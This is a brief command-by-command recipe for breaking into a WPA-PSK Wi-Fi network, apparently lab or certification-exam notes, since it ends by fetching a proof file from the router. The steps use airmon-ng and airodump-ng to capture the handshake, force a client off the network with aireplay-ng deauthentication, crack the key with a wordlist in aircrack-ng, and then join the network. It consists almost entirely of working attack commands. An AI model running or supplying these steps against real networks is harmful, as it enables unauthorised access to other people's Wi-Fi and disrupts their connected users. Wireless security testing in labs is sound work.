### Step-1 Set interface to monitor mode
```bash
sudo airmon-ng start wlan0
```

### Step-2 Identify SSID and BSSID to attack

```bash
sudo airodump-ng wlan0mon
```

### Step-3 Start Capture
```bash
sudo airodump-ng -c 3 -w wpa --essid ESSID --bssid BSSID wlan0mon
```

### Step-4 Start Deauthentication Attack
```bash
sudo aireplay-ng -0 1 -a BSSID -c DMAC wlan0mon
```
### Step-5 Cracking
```bash
aircrack-ng -w /usr/share/john/password.lst -e ESSID -b BSSID wpa-01.cap
```

### Step-6 Turn off monitor mode
```bash
sudo airmon-ng stop wlan0mon
```

### Step-7 Create WPA supplicant conf and start
```bash
nano wpa_supplicant.conf
```
```
network={
ssid="\<ssid\>"
psk="\<password\>"
scan_ssid=1
key_mgmt=WPA-PSK
}
```
```bash
sudo wpa_supplicant -i wlan0 -c wpa_supplicant.conf -d
```

### Step-8 In new tab: pull IP via dhclient and get proof
```bash
sudo dhclient -v wlan0
curl http://192.168.1.1/proof.txt
```

